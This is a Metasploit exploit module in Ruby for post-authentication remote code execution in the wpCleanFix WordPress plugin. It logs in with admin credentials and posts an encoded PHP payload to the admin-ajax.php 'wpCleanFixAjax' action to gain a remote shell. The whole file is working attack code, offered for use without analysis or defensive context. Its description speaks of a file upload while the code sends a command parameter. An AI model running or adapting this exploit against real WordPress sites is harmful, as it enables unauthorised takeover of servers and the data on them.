require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info, 
                      'Name' => 'Wordpress wpCleanFix Post-Auth Remote Code Exec',
                      'Description' => %q{This module exploits an authenticated open file upload to gain a remote shell on the vulnerable instance.

                      This module abuses a function available to administrators for versions 2.3
                      and 2.2.2 of wpCleanFix. Was tested against wordpress 3.8.
                      },
                      'Author' => [],
                      'License' => 'VolatileMinds',
                      'References' => [],
                      'Privileged' => false,
                      'Platform' => ['php'],
                      'Arch' => ARCH_PHP,
                      'Payload' => { 'BadChars' => "&\n=+%" },
                      'Targets' => [['Automatic', {}]],
                      'DefaultTarget' => 0,
                      'Version' => '1',
                      'DisclosureDate' =>'May 15 2013'))
    register_options(
      [
        OptString.new('TARGETURI', [true, "Base Wordpress path", '/']),
        OptString.new('USERNAME', [true, "Wordpress admin username", "admin"]),
        OptString.new('PASSWORD', [true, "Wordpress admin password", "password"])
      ], self.class)
  end

  def exploit
    post = {
      'log' => datastore['USERNAME'],
      'pwd' => datastore['PASSWORD'],
      'wp-submit' => 'Log+In'
    }

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri, "/wp-login.php"),
      'vars_post' => post,
      'method' => 'POST'
    })

    cookies = res.get_cookies

    send_request_cgi({
      'uri' => normalize_uri(target_uri, '/wp-admin/admin-ajax.php'),
      'method' => 'POST',
      'cookie' => cookies,
      'data' => 'action=wpCleanFixAjax&command=' + payload.encoded,
      'headers' => {
       'Pragma' => 'no-cache',
       'Content-Type' => 'application/x-www-form-urlencoded; charset=UTF-8',
       'Cache-Control' => 'no-cache',
       'X-Requested-With' => 'XMLHttpRequest',
       'User-Agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:20.0) Gecko/20100101 Firefox/20.0'
     }
    })
  end
end
